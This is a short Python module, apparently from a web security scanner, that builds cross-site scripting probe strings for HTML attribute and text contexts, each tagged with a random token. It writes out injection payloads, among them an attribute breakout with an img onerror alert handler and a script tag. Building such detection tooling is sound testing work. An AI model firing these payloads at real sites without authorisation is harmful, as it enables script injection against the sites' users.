import random
import string
from typing import List


def make_token(n=6) -> str:
    return "PAY_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class PayloadGenerator:
    def __init__(self):
        pass

    def generate(self, context: str, param: str, limit: int = 2) -> List[str]:
        token = make_token()

        if context == "attribute-name":
            # Used as parameter NAME, no need for templates
            return [token]

        if context == "attribute-value":
            return [
                f'">{token}<',
                f'"><img src=x onerror=alert("{token}")>'
            ][:limit]

        if context == "text-node":
            return [
                f"<script>/*{token}*/</script>",
                token
            ][:limit]

        # fallback
        return [token]
